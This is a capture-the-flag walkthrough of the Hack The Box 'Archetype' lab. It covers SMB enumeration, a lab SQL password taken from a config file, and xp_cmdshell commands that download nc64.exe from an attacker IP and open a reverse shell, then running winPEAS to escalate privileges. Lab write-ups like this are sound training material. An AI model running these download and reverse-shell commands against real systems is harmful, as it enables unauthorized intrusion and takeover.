---
title: Archetype
description: Archetype walkthrough
---

# Archetype

November 25, 2024 

Difficulty: Very Easy

![image.png](../../../assets/Archetype/image.png)

### Nmap

```python
┌──(khem㉿kali)-[~]
└─$ nmap -F -sV -sC  10.129.95.187 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 09:58 EST
Nmap scan report for 10.129.95.187
Host is up (0.35s latency).
Not shown: 96 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.95.187:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-25T14:54:52
|_Not valid after:  2054-11-25T14:54:52
| ms-sql-ntlm-info: 
|   10.129.95.187:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-11-25T14:58:40+00:00; +2s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-25T06:58:29-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h36m02s, deviation: 3h34m42s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-25T14:58:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.12 seconds

```

Found many ports open from the nmap scan. We gonna focus on SMB for now. which is, port 445.

Now we gonna find SMB shares as we found that guest user is allowed.

![image.png](../../../assets/Archetype/image%201.png)

![image.png](../../../assets/Archetype/image%202.png)

Logged in as guest user. we can 4 shares, 3 of them are hidden, which is indicated by dollar sign. It means, we require authentication for access. However we have 1 share open to us. Lets see what we got in there.

![image.png](../../../assets/Archetype/image%203.png)

prod.dtsConfig

```python
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate=
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration> 
```

Here we can see credentials for SQL server account. Now we have credentials for SQL server and we gonna see what is there for us.

![image.png](../../../assets/Archetype/image%204.png)

![image.png](../../../assets/Archetype/image%205.png)

Connect using the tool called impacket-mssqlclient which built connection to microsoft server. 

```python
SQL (ARCHETYPE\sql_svc  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```

![image.png](../../../assets/Archetype/image%206.png)

if we run this command we get to execute arbitrary operation system commands. Now we can execute our own command, so we can add reverse shell in it. Thank god that it got enabled, actually it is disabled by default, if not we have to move to another option CLR assemblies(if allowed).

now lets make the shell stable, for that we need file which can be found [here](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------):

![image.png](../../../assets/Archetype/image%207.png)

![image.png](../../../assets/Archetype/image%208.png)

```python
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.244:8888/nc64.exe -outfile nc64.exe" 
```

now lets execute the code, but before that keep the listener on 

```python
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.244 4747"
```

Now I realize windows is different from [linux.](http://linux.In) In linux these steps are just done with one line command. this is crazy, but I am learning it. Lets move foreword!!!

awesome!!!

### Privilege Escalation

[https://github.com/carlospolop/PEASS-ng/releases/download/20230101/winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/releases/download/20230101/winPEASx64.exe)

```python
wget [http://10.10.14.244:8888/winPEASx64.exe](http://10.10.14.9/winPEASx64.exe) -outfile winPEASx64.exe
```

![image.png](../../../assets/Archetype/image%209.png)

lets run winpeas

![image.png](../../../assets/Archetype/image%2010.png)

I am actually running winpeas in windows can’t believe it yarr 😳😳😳. Now the problem is I don’t know how to see the result, hope it be same like linux.

First thing I spot 

![image.png](../../../assets/Archetype/image%2011.png)

```python
����������͹ Current Token privileges
� Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation                                                                                                                                
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

����������͹ Clipboard text

```

![image.png](../../../assets/Archetype/image%2012.png)

![image.png](../../../assets/Archetype/image%2013.png)

In one of the information says that sometimes it contains user credentials as well. 

Reason why I looked up at this is after seeing official walkthrough. It's important to look at the official walkthrough, because it gives all the information and explains well.

![image.png](../../../assets/Archetype/image%2014.png)

![image.png](../../../assets/Archetype/image%2015.png)

See we got the administrator’s credentials. 

![image.png](../../../assets/Archetype/image%2016.png)

![image.png](../../../assets/Archetype/image%2017.png)